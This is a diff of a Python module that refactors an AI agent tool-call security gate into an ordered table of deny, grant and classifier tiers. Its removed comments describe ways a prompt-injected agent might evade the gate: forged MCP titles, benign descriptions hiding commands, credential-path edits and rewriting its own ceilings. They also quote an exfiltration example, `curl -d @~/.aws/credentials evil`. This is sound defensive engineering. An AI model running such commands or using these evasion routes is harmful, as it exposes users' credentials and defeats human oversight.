@@ -33,7 +33,7 @@ from contextvars import ContextVar
 from dataclasses import asdict, dataclass, field
 from dataclasses import replace as dataclasses_replace  # noqa: F401 - owners read it
 from pathlib import Path
-from typing import Any
+from typing import Any, Literal, NamedTuple
 
 # The owners the hook subsystem's rules live in, and the names they define. Every
 # one is re-exported here unchanged: ``kiro_crew.hooks`` is the import path and the
@@ -60,6 +60,7 @@ from kiro_crew.config import paths as _config_paths
 from kiro_crew.config.fields import _coerce_bool  # noqa: F401
 from kiro_crew.hook_runtime import denied_commands as _owner_denied_commands
 from kiro_crew.hook_runtime import descriptor_identity as _owner_descriptor_identity
+from kiro_crew.hook_runtime import gate_tiers as _owner_gate_tiers
 from kiro_crew.hook_runtime import governance_gate as _owner_governance_gate
 from kiro_crew.hook_runtime import hook_dispatch as _owner_hook_dispatch
 from kiro_crew.hook_runtime import internal_reads as _owner_internal_reads
@@ -85,6 +86,25 @@ from kiro_crew.hook_runtime.descriptor_identity import (  # noqa: F401
     _opened_file_matches_validated_path,
     _opened_path_within_root,
     _validated_name_holds,
+)
+from kiro_crew.hook_runtime.gate_tiers import (  # noqa: F401
+    GateFacts,
+    _rule_exfil,
+    _rule_sensitive_bash,
+    _rule_sensitive_path,
+    _tier_app_own_server,
+    _tier_deny_rules,
+    _tier_governance,
+    _tier_mcp_auto_deny,
+    _tier_operator_grants,
+    _tier_param_paths,
+    _tier_read_only,
+    _tier_search_target,
+    _tier_targets,
+    _tier_unverifiable_shell,
+    _tier_write_protected,
+    gate_tier_problems,
+    shell_rules,
 )
 from kiro_crew.hook_runtime.governance_gate import (  # noqa: F401
     _audit_governance,
@@ -140,6 +160,7 @@ from kiro_crew.hook_runtime.stream_caps import (  # noqa: F401
     _read_capped_stream,
 )
 from kiro_crew.hook_runtime.tool_identity import (  # noqa: F401
+    ToolCall,
     _app_owns_mcp_server,
     _builtin_app_for_agent,
     _context_matches,
@@ -200,7 +221,7 @@ from kiro_crew.security import (  # noqa: F401 - the path owners read these
     is_unverifiable_path_refusal,
     sensitive_path_refusal,
 )
-from kiro_crew.security.readonly_bash import is_read_only_bash
+from kiro_crew.security.readonly_bash import is_read_only_bash  # noqa: F401 - the owners read it
 from kiro_crew.sel import sel
 from kiro_crew.session_directive import CORE_MCP_SERVER  # noqa: F401
 from kiro_crew.validation import _bounded_pattern_search  # noqa: F401
@@ -394,6 +415,13 @@ class ToolHookResult:
     #: both alike. The action alone cannot say which branch produced it, and a
     #: result built outside the factory stays unproven (False) — fail-closed.
     read_only: bool = False
+    #: The ``GATE_TIERS`` row that decided, stamped by ``HookManager.judge`` -- the
+    #: per-target rule's name for a per-target tier (``"sensitive-bash"``, the same
+    #: name the denial differential reports). ``""`` when no tier decided (the
+    #: fall-through ``allow``), when the gate itself crashed, and for a result built
+    #: anywhere else. Not part of equality: it says WHERE a verdict came from, not
+    #: what it is.
+    tier: str = field(default="", compare=False)
 
     @staticmethod
     def _count(action: str, security_deny: bool) -> None:
@@ -407,8 +435,8 @@ class ToolHookResult:
         object would report one request as two decisions AND keep a count for a
         verdict that was then discarded.
 
-        The two rejected alternatives were instrumenting the 23 exits of
-        ``HookManager.on_tool_call`` (23 call sites on a security path) and
+        The two rejected alternatives were instrumenting every exit of the gate's
+        tiers (one call site per exit, on a security path) and
         counting in ``__post_init__`` behind a ``from_gate`` flag -- the flag had
         no reader other than the counter itself, so it was state carried purely to
         signal, where calling this from the four factories says the same thing
@@ -478,22 +506,32 @@ GATE_CRASH_REASON = (
 )
 
 
+#: The reason every call is refused when ``GATE_TIERS`` is not a sound gate table
+#: (``_GATE_TABLE_PROBLEMS``). Like :data:`GATE_CRASH_REASON`, it says the refusal is
+#: a gate defect rather than a rule the call broke or a user action.
+GATE_TABLE_UNSOUND_REASON = (
+    "Blocked: the safety check's tier table failed its own consistency check, so every "
+    "call is refused and nothing ran. This is a Kiro Crew bug, not a policy rule and not "
+    "a user action."
+)
+
+
 def _fail_closed_on_gate_crash(judge: Any) -> Any:
     """Turn an exception out of the tool gate into a visible security deny.
 
     The gate parses untrusted command text, and a parser can raise on input
     nobody anticipated (a NUL byte once made the inline-payload lexer raise
-    ``SystemError``). An exception that escapes ``on_tool_call`` reaches each
-    caller's own handling -- some refuse with a vague reason, some let the
-    turn fail, and on the dashboard the call was reported as aborted by the
-    user. Refusing here, in the one place every surface consults, makes the
-    outcome the same everywhere: fail closed, and say why.
+    ``SystemError``). An exception that escapes ``HookManager.judge`` (and so
+    ``on_tool_call``) reaches each caller's own handling -- some refuse with a
+    vague reason, some let the turn fail, and on the dashboard the call was
+    reported as aborted by the user. Refusing here, in the one place every
+    surface consults, makes the outcome the same everywhere: fail closed, and
+    say why.
 
     ``PlatformCompositionError`` still propagates: it means the host itself is
     mis-composed, which the gate re-raises on purpose so a broken install is
     loud instead of degrading one call at a time. ``functools.wraps`` keeps the
-    wrapped signature and source visible to ``inspect``, which the gate's
-    parameter-parity and source-shape tests read.
+    wrapped signature visible to ``inspect``.
     """
 
     @functools.wraps(judge)
@@ -510,6 +548,45 @@ def _fail_closed_on_gate_crash(judge: Any) -> Any:
             return ToolHookResult.deny(GATE_CRASH_REASON.format(error=type(exc).__name__))
 
     return wrapper
+
+
+# ── Gate table types ──
+
+#: What a ``GATE_TIERS`` row may do, in the only order rows may run: a security
+#: deny, a policy deny (``ToolHookResult.deny_policy``), a grant (whose body
+#: steps aside under ``classifier_only``), and the read-only classifier.
+GateTierKind = Literal["deny", "deny_policy", "grant", "classify"]
+_GATE_TIER_KINDS: tuple[str, ...] = ("deny", "deny_policy", "grant", "classify")
+
+
+class GateRule(NamedTuple):
+    """One check a per-target tier applies to each security target.
+
+    ``check`` returns a refusal reason or ``None``. ``shell_rule`` names the
+    ``kiro_crew.security`` attribute the check applies to a shell command line, for
+    the rules :data:`SHELL_DENY_TIERS` lists; ``""`` for a rule that is not one.
+    """
+
+    name: str
+    check: Callable[[GateFacts, str], str | None]
+    shell_rule: str = ""
+
+
+class GateTier(NamedTuple):
+    """One row of the tool gate, run by ``HookManager.judge`` in table order.
+
+    ``judge`` is handed the call's :class:`GateFacts` and its own row, and returns a
+    verdict through ``ToolHookResult``'s counted factories or ``None`` to let the
+    next row decide. ``rules`` makes a per-target tier: every rule against every
+    security target, target-major. ``shell_rule`` is as on :class:`GateRule`, for a
+    tier that is itself one shell check.
+    """
+
+    name: str
+    kind: GateTierKind
+    judge: Callable[[GateFacts, GateTier], ToolHookResult | None]
+    shell_rule: str = ""
+    rules: tuple[GateRule, ...] = ()
 
 
 # ── Config Types ──
@@ -865,6 +942,76 @@ class HookManager:
     # ── Tool hooks ──
 
     @_fail_closed_on_gate_crash
+    def judge(
+        self,
+        call: ToolCall,
+        *,
+        session_key: str = "",
+        agent: str = "",
+        app: str = "",
+        classifier_only: bool = False,
+    ) -> ToolHookResult:
+        """Whether *call* is auto-approved, denied, or handled normally.
+
+        Walks :data:`GATE_TIERS` in table order and returns the first verdict a tier
+        hands back, stamped with that tier's name in ``ToolHookResult.tier`` (a
+        per-target tier stamps the rule that refused). No tier decides: ``allow``,
+        which falls through to the surface's own approval path.
+
+        What holds for every call, whatever the table holds:
+
+        * every deny tier runs before every grant tier, and the read-only
+          classifier runs last -- the table's kinds are monotone, which
+          ``gate_tier_problems`` checks when this module loads, so a grant can
+          never re-admit something a deny blocked (an unsound table refuses every
+          call with :data:`GATE_TABLE_UNSOUND_REASON`);
+        * the platform context is read ONCE (:class:`GateFacts`), so a live ceiling
+          refresh cannot split one call's verdict across two policy states;
+        * exactly one ``approval_decisions`` counter is emitted, because every tier
+          returns through ``ToolHookResult``'s counted factories (none under
+          :func:`uncounted_gate`);
+        * nothing here resolves a program name or touches the filesystem beyond the
+          path checks: it is synchronous and called ON the event loop, so the
+          name-grant check runs off-loop in the surfaces;
+        * a tier that raises turns into a visible security deny
+          (``_fail_closed_on_gate_crash``); ``PlatformCompositionError`` propagates.
+
+        ``session_key`` / ``agent`` / ``app`` identify the calling surface so the
+        governance ceiling ∩ active-profile can be resolved and a tool/MCP call
+        denied even when the kiro agent config granted it (the governance headline
+        behavior). They default to ``""``; a caller that supplies identity opts into
+        per-surface governance.
+
+        ``classifier_only`` drops the GRANT tiers -- the app-own-server rule and the
+        operator's ``auto_approve_tools`` globs -- so the only auto-approve left is
+        the read-only classifier's, which carries ``read_only=True`` on the result. A
+        grant vouches for the caller and says nothing about the call's effect;
+        ``ToolApprovalPolicy.READ_ONLY`` (the side chat) has no approver behind it,
+        so a grant honoured there would execute a mutating tool. Every deny tier and
+        governance still run, and a call a grant would have approved is classified
+        on its own merits instead of being refused outright (a grant that shadows a
+        read costs nothing, a grant that shadows a write approves nothing). Default
+        ``False``: a caller with an interactive approver keeps the grants.
+        """
+        if _GATE_TABLE_PROBLEMS:
+            return ToolHookResult.deny(GATE_TABLE_UNSOUND_REASON)
+        facts = GateFacts(
+            self,
+            call,
+            session_key=session_key,
+            agent=agent,
+            app=app,
+            classifier_only=classifier_only,
+        )
+        for tier in GATE_TIERS:
+            verdict = tier.judge(facts, tier)
+            if verdict is not None:
+                if not verdict.tier:
+                    verdict.tier = tier.name
+                return verdict
+        return ToolHookResult.allow()
+
+    @_fail_closed_on_gate_crash
     def on_tool_call(
         self,
         tool_name: str,
@@ -884,808 +1031,39 @@ class HookManager:
         resolved_agent: str = "",
         classifier_only: bool = False,
     ) -> ToolHookResult:
-        """Check if a tool should be auto-approved, denied, or handled normally.
+        """:meth:`judge`, for a caller that holds the call as keywords.
 
-        ``tool_name`` is the display title/pill label. For shell tools it may
-        be an LLM-authored ``description`` string rather than the literal
-        command (``select_tool_title`` in ``acp/_dispatch.py`` prefers
-        ``description`` over ``command``), so it is UNTRUSTED for security
-        decisions. When the caller has the raw executable command it MUST pass
-        it as ``command=``; every security check then also runs against the
-        real command, closing the bypass where a benign title/description hid
-        a dangerous command (``auto_deny_tools`` and the sensitive-path /
-        credential-read protections both keyed off the title otherwise).
-        Over-blocking is the safe direction: a match on EITHER the title or the
-        command denies. Auto-approve stays keyed on the title only — failing to
-        auto-approve merely falls through to interactive approval.
-
-        The optional keyword-only ``session_key`` / ``agent`` / ``app`` identify
-        the calling surface so the governance ceiling ∩ active-profile can be
-        resolved and a tool/MCP call denied even when the kiro agent config
-        granted it (the governance headline behavior).  They default to ``""`` so
-        every existing caller is unaffected; a caller that supplies identity opts
-        into per-surface governance.
-
-        ``tool_kind`` (the ACP semantic kind: ``read``/``edit``/``fetch``/…) and
-        ``raw_params`` (the real tool arguments — ``path``/``url``) let the gate
-        enforce the path/host scopes a display title cannot carry
-        (``filesystem.write``, ``network.egress``).  Both default to empty, so a
-        caller that does not thread them only loses those two arg-derived scopes,
-        never the title-derived ones.  ``raw_params`` additionally feeds the deny
-        tiers a synthesized ``file-search …`` target (``_search_deny_target``) for a
-        search-shaped call, whose walked root and depth cap exist ONLY in its
-        arguments; a caller that omits ``raw_params`` loses that coverage too.
-
-        ``diff_path`` is the path the tool call's ``{"type": "diff"}`` content
-        block named (``event.diff_path``, cached by ``acp._dispatch`` per scoped
-        toolCallId). A nonempty ``diff_path`` is itself write-plane evidence —
-        the cache is written only when a tool_call frame declares a file
-        change — so the write-protected tier judges any call carrying one (or
-        declaring the ``edit`` kind) by the UNION of the params' path
-        spellings and this path, and denies an empty union: a backend may
-        stream params that carry no path key and name the file only in that
-        block, so the params alone can judge nothing
-        (mirroring ``llm_helpers._edit_target_denial``). Defaults to
-        ``""``: a caller that does not thread it keeps params-only judgement of
-        edits, and an edit-kind call that carries params (any dict, ``{}``
-        included) or a diff block but names no path is denied rather than
-        passed unjudged. Only ``raw_params=None`` with no ``diff_path`` falls
-        through — such an edit has nothing to judge here and keeps the other
-        tiers' coverage, exactly like ``_edit_target_denial``, which an edit
-        with no params never reaches.
-
-        ``is_shell`` enforces deny-by-default for shell tools: when a caller
-        reports a shell tool (``is_shell=True``) but cannot supply the raw
-        ``command`` (extraction failed — e.g. malformed params), the title
-        alone is not a trustworthy basis for a decision, so the call is DENIED
-        rather than silently falling through to the title-only checks. Callers
-        that always pass a resolved command can leave ``is_shell`` at its
-        default; those forwarding an event should pass both the command and the
-        event's ``is_shell`` flag.
-
-        ``mcp_server_name`` is the NON-model-authored MCP server identity from
-        the ACP event's ``_meta.kiro.mcpServerName`` (``AcpEvent.mcp_server_name``),
-        set by kiro-cli ONLY for MCP-served tool calls and empty for shell /
-        built-in tools. It is the trusted discriminator "this call was genuinely
-        served by MCP server X" — as opposed to the LLM-authored ``tool_name``
-        title, which a prompt-injected agent can forge (e.g. titling a Bash call
-        ``mcp__<app>:srv__x``). The app-own-server auto-approve keys on THIS, never
-        on the title, so a forged title cannot win an auto-approval. Empty (the
-        default, or a backend that omits ``_meta.kiro``) fails closed: no match.
-
-        ``mcp_tool_name`` is the sibling NON-model-authored tool identity from
-        ``_meta.kiro.toolName`` (``AcpEvent.tool_name``). Despite the name it is
-        NOT MCP-only: kiro-cli sets it for every tool call it serves, built-ins
-        included, and sets ``mcp_server_name`` only for MCP-served ones. It is
-        therefore evaluated on the deny and governance planes whenever present,
-        server or no server -- otherwise a built-in's real name (``fs_write``)
-        reaches no check at all and a deny/ceiling rule naming it is bypassable
-        behind a benign model-authored title. With both present the
-        gate reconstructs the canonical ``mcp__<server>__<tool>`` name and runs
-        the effective deny set AND the governance ceiling against it as well as
-        against the title — because the ``tool_name`` title above is LLM-authored
-        prose (``select_tool_title`` prefers the model's ``description``) and may
-        not carry the canonical form a per-tool MCP policy matches on. Without
-        this, an ordinary MCP call whose policy-denied tool arrives under a benign
-        description would pass the gate and reach the human prompt, where an
-        "allow" would run a tool the ceiling forbids.
-
-        The canonical name is ADDED to those checks, never SUBSTITUTED for the
-        title: the two carry different security signals. The canonical name is
-        the trusted statement of WHICH MCP tool is being invoked, and is what a
-        per-tool ceiling or deny rule matches. The title and raw command carry
-        the path, command and content signals that a tool identity does not
-        express — ``~/.aws/credentials`` read through an innocuously named MCP
-        tool is denied by the title, not by the identity. Different dimensions,
-        so a deny on EITHER denies the call. Empty (no ``_meta.kiro.toolName``)
-        means the tool cannot be identified, so the own-server auto-approve does
-        NOT fire (fall through to interactive approval — fail-closed).
-
-        ``classifier_only`` drops the two GRANT tiers — the operator's
-        ``auto_approve_tools`` globs and the app-own-server rule — so the only
-        auto-approve left is the read-only classifier's, which carries
-        ``read_only=True`` on the result. A grant vouches for the caller and
-        says nothing about the call's effect; ``ToolApprovalPolicy.READ_ONLY``
-        (the side chat) has no approver behind it, so a grant honoured there
-        would execute a mutating tool. Every deny tier and governance still
-        run, and a call a grant would have approved is classified on its own
-        merits instead of being refused outright. Default ``False``: a caller
-        with an interactive approver keeps the grants.
-
-        Under the flag the classifier also tightens WHAT counts as proof: with
-        no approver to catch an over-approval, read-only must follow from
-        HOST-TRUSTED facts alone — the recovered shell ``command`` judged by
-        ``is_read_only_bash``, or a built-in the host knows to be read-only,
-        named by the non-model-authored ``mcp_tool_name`` with no
-        ``mcp_server_name`` (``_HOST_READ_ONLY_BUILTIN_TOOLS``) AND carrying
-        ``mcp_identity_trusted``, the provenance flag saying that pair came
-        from the ``_meta.kiro`` parse this client made of the tool_call frame
-        (``AcpEvent.mcp_identity_trusted``) rather than from an inline payload
-        or a hand-built event — without it a host-known name is unproven and
-        refused. The agent-influenced inputs — the ACP ``tool_kind`` and the title —
-        may NARROW (a non-read kind refuses) but never prove, so a mutating tool
-        labelled ``kind="read"`` or titled ``Read …`` is not auto-approved; an
-        MCP-served tool, which carries no host-trusted read-only marker, is not
-        provable either. Off the flag the interactive path keeps its ACP-kind
-        allow-list and title fallback unchanged.
+        ``tool_name`` is the call's display title; every other keyword is the
+        :class:`ToolCall` field of the same meaning (``tool_kind`` -> ``kind``,
+        ``mcp_server_name`` -> ``mcp_server``, ``mcp_tool_name`` -> ``mcp_tool``,
+        ``mcp_identity_trusted`` -> ``identity_trusted``) or a surface argument of
+        :meth:`judge`. A dispatcher holding a permission event passes
+        ``**hook_gate_kwargs(event)``, so an enforcement-relevant event field is
+        threaded once. Each field's security meaning is documented on
+        :class:`ToolCall`; what the gate does with them, on :meth:`judge` and in
+        :data:`GATE_TIERS`. Wrapped like :meth:`judge`, so a call that cannot even
+        bind (a stray keyword, a surface argument passed positionally) is refused as
+        a gate crash rather than raised into the caller's own handling.
         """
-        # Deny-by-default: a shell tool whose command could not be recovered
-        # must not be evaluated on the untrusted title alone — that is the very
-        # bypass this gate closes. Reject instead of falling through.
-        #
-        # This refusal is UNCONDITIONAL, and deliberately has no operator override.
-        # An override was implemented and removed on this PR: ``ToolHookResult``
-        # carries only ``allow`` / ``auto_approve`` / ``deny``, so a suppressed call
-        # can at best return ``allow``, and ``allow`` falls through to
-        # patterns / trust-reads / trust / YOLO / interactive in the dashboard
-        # runner. Under YOLO — or a trust grant, or native-crew auto-approve — the
-        # unverified command would then execute with no human ever seeing it, which
-        # is precisely what this gate exists to prevent, in exactly the
-        # configuration an operator who wants the convenience is likeliest to run.
-        # Barring the hook-level auto-approve branches is NOT sufficient, because
-        # the decision is re-made downstream.
-        #
-        # The false-positive that motivated the override (a provider payload shape
-        # this build does not recognize yields no command even for an ordinary
-        # call — see ``AcpEvent.shell_command``) is real, but the fix belongs in
-        # recognizing the payload shape, not in admitting commands no gate read.
-        # Making this suppressible would need a fourth action meaning "force the
-        # interactive prompt, and let no downstream tier auto-grant it".
-        if is_shell and not command:
-            return ToolHookResult.deny(
-                "Blocked: shell command could not be verified for security "
-                "policy (deny-by-default)"
-            )
-
-        # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
-        # patterns like "ls" or "rm *" match without the prefix.
-        normalized = _normalize_tool_name(tool_name)
-
-        # Security checks run against the raw command (when available) AND the
-        # display title. The command is the ground truth for shell tools; the
-        # title is retained so non-shell tools (whose identifier IS the title)
-        # stay gated and so a dangerous title can't slip through behind a
-        # benign command.
-        security_targets = [normalized]
-        if command and command not in security_targets:
-            security_targets.append(command)
-        # A harness may stream its shell tool under a kind other than ``execute``
-        # (the DeepSeek harness sends ``bash`` as ``other``), so no shell command
-        # is recovered and every check below would see only the title. The tool's
-        # own ``command``/``cmd`` argument is then judged by the SHELL-class
-        # checks (scan ceiling, IMDS, env-credential, exfiltration) and the
-        # deny-rule catalog -- never by the path tier, which reads a value as a
-        # filename. Deny-only: allow paths and the shell exemption still key on
-        # ``is_shell``/``command``, so this can refuse a call but never grant
-        # one. A call that names its MCP server is left out: its
-        # ``command``-named arguments are not shell text, and it is governed by
-        # ``@server/tool`` rules. A harness that names no server for its MCP
-        # calls (claude-agent-acp, opencode, dsh, pi) cannot be told apart here,
-        # so such a call's ``command`` argument is checked too.
-        raw_shell_commands: list[str] = []
-        if not command and not mcp_server_name and isinstance(raw_params, dict):
-            for _key in ("command", "cmd"):
-                _raw_command = raw_params.get(_key)
-                if (
-                    isinstance(_raw_command, str)
-                    and _raw_command
-                    and _raw_command not in raw_shell_commands
-                ):
-                    raw_shell_commands.append(_raw_command)
-
-        # Sensitive path protection (always enforced, before all other checks).
-        # kiro-cli adds "Reading "/"Running: " display prefixes; the
-        # claude-agent-acp adapter does NOT (its file-read title is the bare
-        # path, its Bash title the bare command). So the prefix only HINTS at
-        # the tool kind — we must run every check on every target regardless of
-        # prefix, or credential reads slip through on the Claude Code provider.
-        # Each target is the normalized title AND (for shell tools) the raw
-        # command, so an LLM-authored benign title can't hide a dangerous
-        # command from any of these gates. is_sensitive_path resolves the value
-        # as a path: a real file-read title ("~/.aws/credentials") matches,
-        # while a bash command ("cat ~/.aws/credentials") resolves to a
-        # non-sensitive path and is NOT matched on its text -- the OS sandbox is
-        # what keeps the credential stores and the governance keystone out of the
-        # shell's reach. A shell tool's recovered COMMAND is therefore not handed
-        # to the path tier: resolving ``cd /x && grep ...`` as a filename never
-        # matched, but it spent a resolver round-trip per call and, under a
-        # resolver stall, refused the command as ``access to sensitive path: cd
-        # /x && grep ...`` -- a refusal naming something that is not a path as a
-        # credential. ``is_shell`` and ``command`` are the client's own
-        # classification and recovery of the tool frame, the same provenance the
-        # shell gates below trust; a shell tool whose command is a bare path is
-        # left to the sandbox, as every command is.
-        # is_sensitive_bash_command carries the size ceiling, the
-        # IMDS detector and the environment-credential detector.
-        # The always-on gates below are keyed by rule id, so resolve the effective
-        # regex set to ids ONCE here and thread it in. ``None`` means all enabled,
-        # which is what the callers outside this gate (cron command vetting,
-        # computer-use input vetting) keep passing.
-        #
-        # ONE context snapshot for the WHOLE gate, reused by the catalog checks
-        # further down. Reading ``current_context()`` twice let a live ceiling
-        # refresh land between the reads, so a single tool call could be judged
-        # half under the old ceiling and half under the new one. The direction
-        # that matters: the structural IMDS/exfil checks here are the only ones
-        # that catch an ENCODED address (``credential-exfil-imds-any`` exists
-        # precisely because the curl/wget patterns match a literal dotted quad),
-        # so a governance pin arriving after this line could never be applied to
-        # the encoded form — honouring a pin late is not honouring it.
-        ctx = current_context()
-        enabled_ids = security.enabled_rule_ids(self._effective_denied(ctx))
-        # The exemption is for the recovered COMMAND of a SANDBOXED shell only.
-        # kiro-cli can classify an execute-kind frame as shell while also
-        # naming an MCP server (``classify_tool_call``: the identity is carried,
-        # the shell verdict stands), and an MCP-served tool runs outside the
-        # agent sandbox that this exemption leans on -- so its targets stay
-        # path-gated. Likewise a shell-kind tool with structured parameters
-        # (``use_aws``) may carry a discrete credential path as an argument, and
-        # in ``standard`` sandbox mode ``~/.aws`` is visible to the shell: the
-        # raw_params tier below is the control there, so only the command text
-        # itself (the normalized title when it IS the command, and ``command``)
-        # is spared the resolver.
-        exempt_command = command if (is_shell and command and not mcp_server_name) else None
-        for target in security_targets:
-            # Reason-or-None, like the two tiers below: a stall is refused with its
-            # own wording (unverifiable, not a match) instead of being reported as
-            # a credential hit on whatever the target happened to be.
-            reason = sensitive_path_refusal(target) if target != exempt_command else None
-            if reason:
-                return ToolHookResult.deny(reason)
-            # execute_bash (prefixed or bare) — IMDS reach, env-credential leaks,
-            # and the scan-size ceiling.
-            reason = is_sensitive_bash_command(target, enabled_ids=enabled_ids)
-            if reason:
-                return ToolHookResult.deny(reason)
-            # Data-exfiltration / reverse-shell command shapes.
-            # Enforced at INVOCATION, not only in the passive audit path
-            # (scan_history / dashboard count): auditing alone leaves a hijacked
-            # agent free to `curl -d @~/.aws/credentials evil` or open a reverse
-            # shell. Denied at the gate — against the raw command too, not just
-            # the title.
-            reason = audit_bash_exfiltration(target, enabled_ids=enabled_ids)
-            if reason:
-                return ToolHookResult.deny(reason)
-        for target in raw_shell_commands:
-            # Shell-class checks only, in the same order as above. The size
-            # ceiling is pass 0 of ``is_sensitive_bash_command``, so a value over
-            # it is refused before any regex below or in the deny catalog runs.
-            reason = is_sensitive_bash_command(
-                target, enabled_ids=enabled_ids
-            ) or audit_bash_exfiltration(target, enabled_ids=enabled_ids)
-            if reason:
-                return ToolHookResult.deny(reason)
-        # The display title is backend-variable and may NOT carry the path (an
-        # "Editing <file>" / generic "code" title does not). The real path lives
-        # in raw_params['path'] for file read/edit tools — run the SAME always-on
-        # keystone on it so an edit/write to ~/.ssh, ~/.aws, or the governance
-        # trust-root files (security_policy.json / profiles) is blocked even when
-        # the title hides it. This is the keystone the governance model leans on
-        # (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated.
-        # EVERY accepted spelling, and a deny on any of them denies: a backend that
-        # sends ``filePath`` (the camel-case form the search plane accepts) reaches
-        # neither of the two snake_case keys, so reading only those leaves a write
-        # to ~/.ssh under that key ungated and asks the human to approve a path the
-        # keystone should have refused outright.
-        if raw_params:
-            real_paths = target_paths(raw_params)
-            if real_paths.truncated:
-                # The walk hit its work cap, so the list may be INCOMPLETE. A
-                # partial scan must not be trusted as a full one — deny, same
-                # deny-by-default shape as the unrecoverable shell command
-                # above. No legitimate tool call carries hundreds of target
-                # paths, so this refuses only attacker-shaped payloads.
-                return ToolHookResult.deny(
-                    "Blocked: tool arguments too large to verify for sensitive "
-                    "paths (deny-by-default)"
-                )
-            for real_path in real_paths:
-                reason = sensitive_path_refusal(real_path)
-                if reason:
-                    return ToolHookResult.deny(reason)
-        # Config files are WRITE-protected (reads stay allowed): block the agent's
-        # file-EDIT tool from modifying config.json / config.local.json so a
-        # prompt-injected agent cannot rewrite its own resource ceilings
-        # (concurrent subagents, turn budget, warm-pool size) to drive host
-        # resource exhaustion. Gated
-        # on the ACP ``edit`` kind (the fs_write/code tool) so a plain read of
-        # config is unaffected — the dashboard file viewer, ``cat``, and knowledge
-        # indexing legitimately read config.json. Bash writes (``tee``/``>``/
-        # ``cp``-dest) are not matched on command text; the OS sandbox is the
-        # shell-side control, and this branch covers the file-EDIT tool.
-        #
-        # The branch routes on ``is_edit_call``: the ``edit`` kind, OR a diff
-        # content block naming a path — the diff block is the edit's target of
-        # record, and only a call declaring a file change carries one, so its
-        # PRESENCE is write-plane evidence however the spec-optional ``kind``
-        # field arrived (empty, or even ``read``). The read allowance below is
-        # keyed on the ABSENCE of a diff block, not on the kind: a kindless
-        # call WITHOUT one stays a read, because
-        # ``governance._scopes_for_call`` (platform/governance.py) infers BOTH
-        # filesystem.read AND filesystem.write from a lone ``path`` when the
-        # kind is empty as a *policy intersection* where an ungoverned scope
-        # permits, while this gate is a HARD deny — applying that shape
-        # inference to diff-less calls would block legitimate config READS,
-        # regressing the read-allowance that is the whole point of the
-        # write-only tier. The OS sandbox covers the shell surface.
-        if is_edit_call(tool_kind, diff_path) and (raw_params is not None or diff_path):
-            # Same spelling coverage as the sensitive-path keystone above, for the
-            # same reason: the write-protected tier is worthless if a config edit
-            # can name its target under a key the check never reads. The judged
-            # set is the UNION of the params' path spellings and the diff content
-            # block's path, computed by the SAME helper the always-enforced tier
-            # uses (``edit_target_candidates``): a backend may stream params that
-            # carry no path key at all and name the file only in that block, so
-            # the params alone can judge nothing.
-            candidates = edit_target_candidates(raw_params, diff_path)
-            if candidates.truncated:
-                # Unreachable while the keystone above denies a truncated walk
-                # first, but this branch keeps its own fail-closed reading so a
-                # reorder above cannot silently turn a partial scan into a pass.
-                return ToolHookResult.deny(
-                    "Blocked: tool arguments too large to verify for sensitive "
-                    "paths (deny-by-default)"
-                )
-            if candidates.unanchored:
-                # The diff block's path is a verbatim backend field. A relative
-                # one resolves against the gateway process CWD, not the agent
-                # workspace, so a workspace symlink can point it at a protected
-                # file no gate would recognize under its unanchored spelling —
-                # deny as unverifiable, same fail-closed shape as truncation.
-                return ToolHookResult.deny(
-                    "Blocked: file edit names a relative target path that "
-                    "cannot be verified (deny-by-default)"
-                )
-            if not candidates:
-                # Mirrored from the always-enforced tier: a declared file edit
-                # whose params and content block together name no target has no
-                # proven target to judge — deny rather than approve blind.
-                # ``raw_params={}`` takes this deny too (the branch enters on
-                # ``is not None``, not truthiness), matching
-                # ``_edit_target_denial``, which selects ANY dict via
-                # ``isinstance`` and denies its empty union — a falsy-guard
-                # skip here would be the fail-open the two-gate parity exists
-                # to prevent. Scoped to the edit kind: the empty/unknown
-                # ``tool_kind`` case above stays a read allowance, and an edit
-                # event carrying ``raw_params=None`` and no diff block never
-                # enters this branch (matching ``_edit_target_denial``, which
-                # such an edit never reaches either).
-                return ToolHookResult.deny(
-                    "Blocked: file edit names no target path to verify (deny-by-default)"
-                )
-            for wpath in candidates:
-                if is_sensitive_write_path(wpath):
-                    return ToolHookResult.deny(
-                        f"Blocked: modification of write-protected config path: {wpath}"
-                    )
-        # Built-in security deny list (always enforced).  Route through the
-        # active PlatformContext's PolicyAuthority so the Amazon companion's
-        # ADD-only deny overlay (+ internal patterns) applies when loaded.  The
-        # standalone Default authority uses an empty overlay, so this resolves
-        # to ``security.is_denied(name, auto_deny_tools)`` exactly as before —
-        # no recursion (PolicyAuthority.is_denied calls security.is_denied with
-        # the overlay patterns appended; security.is_denied never calls back).
-        # Check the raw command (ground truth) as well as the normalized and
-        # original title forms.
-        # Reuses the ONE snapshot taken at the top of the gate — see the comment
-        # there. A second read here would let a ceiling refresh split this call's
-        # verdict across two policy states.
-        authority = ctx.security
-        denied_regexes = self._effective_denied(ctx)
-        denied_notes = self._denied_notes()
-        deny_targets = [normalized, tool_name]
-        # The canonical ``mcp__<server>__<tool>`` identity, when kiro-cli supplied
-        # BOTH trusted ``_meta.kiro`` fields. ``select_tool_title`` prefers the
-        # model's prose ``description``, so ``tool_name`` for an MCP call may be
-        # "Look up the weather" rather than the canonical form a per-tool deny
-        # rule or MCP policy matches on. Reconstructing it here — on the COMMON
-        # path, before the deny floor and governance — is what makes a rule keyed
-        # on the real tool identity bind for every consumer of this gate, not
-        # only for the first-party own-server auto-approve below.
-        #
-        # ADDITIVE, never a substitution: the display title and the raw command
-        # stay in every check they were already in. They are not competing
-        # spellings of one fact — the canonical name is the trusted statement of
-        # WHICH tool runs, which is what a per-tool rule matches, while the title
-        # and command carry the path/command/content signals that identity does
-        # not express. Each covers a security dimension the other cannot, so both
-        # are evaluated and a deny on either denies. Both fields empty (a non-MCP
-        # call, or a backend that omits ``_meta.kiro``) leaves every target
-        # exactly as before.
-        canonical_mcp_name = (
-            f"mcp__{mcp_server_name}__{mcp_tool_name}" if mcp_server_name and mcp_tool_name else ""
+        return self.judge(
+            ToolCall(
+                title=tool_name,
+                kind=tool_kind,
+                raw_params=raw_params,
+                diff_path=diff_path,
+                command=command,
+                is_shell=is_shell,
+                mcp_server=mcp_server_name,
+                mcp_tool=mcp_tool_name,
+                identity_trusted=mcp_identity_trusted,
+                spawn_target=spawn_target,
+                resolved_agent=resolved_agent,
+            ),
+            session_key=session_key,
+            agent=agent,
+            app=app,
+            classifier_only=classifier_only,
         )
-        if canonical_mcp_name:
-            deny_targets.append(canonical_mcp_name)
-        # The trusted tool identity on its own, which is the ONLY form a built-in
